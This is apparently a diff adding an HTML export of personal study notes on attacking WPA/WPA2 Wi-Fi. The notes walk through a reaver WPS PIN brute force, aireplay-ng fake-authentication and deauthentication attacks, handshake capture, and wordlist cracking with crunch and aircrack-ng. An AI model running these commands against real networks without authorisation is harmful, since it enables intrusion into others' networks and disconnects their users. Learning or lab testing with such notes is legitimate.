@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="author" content="MarkdownViewer++" />
+        <title>WPA and WPA2.md</title>
+        <style type="text/css">
+            
+/* Avoid page breaks inside the most common attributes, especially for exports (i.e. PDF) */
+td, h1, h2, h3, h4, h5, p, ul, ol, li {
+    page-break-inside: avoid; 
+}
+
+        </style>
+      </head>
+    <body>
+        <p><a href="..">Back</a></p>
+<p>WPS ENABLED AND PBC DISABLED<br />
+wpa and wpa2 have a wps feature which makes it easier to connect to it<br />
+if wps is enabled and there is no PBC(push button authentication) enabled, we can easily connect to the network<br />
+a wps enabled network doesnt need the passwd for connecting to it, but a 8 digit pin</p>
+<p>wash --interface <mon interface> finds all networks with their wps on<br />
+aireplay-ng --fakeauth <time btw each attack> -a <target bssid> -h <my bssid> <mon interface> but don't start it yet, go to another terminal now<br />
+you can see your bssid as first 12 digits seperated by - beside unspec, using ifconfig</p>
+<p>reaver --bssid <target> --channel <ch> --interface <mon interface> -vvv --no-associate and enter to start bruteforce<br />
+go to above terminal and start aireplay fake authentication attack</p>
+<p>latest version of reaver may be buggy, send_packet called from resend_last_packet() send.c:161 is repeating itself very fast<br />
+then we have to use older version of reaver 1.6.1<br />
+open the folder where it is downloaded to <br />
+cd Downloads/<br />
+chmod +x reaver to make it as a executable in permissions<br />
+./reaver --bssid <target> --channel <ch> --interface <mon interface> -vvv --no-associate<br />
+-vvv gives information about the process and no-associate will stop reaver from doing association automatically which is buggy<br />
+if cracked, we will get it at wps psk</p>
+<p>HANDSHAKE CAPTURE<br />
+airodump-ng --band abg <mon interface> to find all 5hz and 2.4hz networks<br />
+airodump-ng --bssid <target> --channel <ch> --write <storing file for captured date> <mon interface> to store captured data<br />
+wait till a client connects to the network<br />
+do deauth attack to the client to speed the process</p>
+<p>aireplay-ng --deauth 5 -a <target> -c <client> <mon interface><br />
+this time no.of attacks should be small<br />
+stop attack when wpa handshake is captured</p>
+<p>CRACKING CAPTURED HANDSHAKE<br />
+we can do this using wordlists or bruteforce(for number password)<br />
+we use crunch to create a own wordlist</p>
+<p>crunch <min characters> <max> &lt;characters like abc123!@#&gt; -t &lt;combination like a@@@b&gt; -o<file to save><br />
+for example, use<br />
+crunch 6 8 abc12 -o test.txt<br />
+use cat test.txt to view the file</p>
+<p>aircrack-ng &lt;handshake.cap cap file&gt; -w &lt;worldlist.txt wordlist file&gt;<br />
+if the key is in the wordlist, only then will the password be found<br />
+you can use free websites like onlinehashcrack to do dictionary attacks</p>
+<p><a href="..">Back</a></p>
+
+    </body>
+</html>
+            
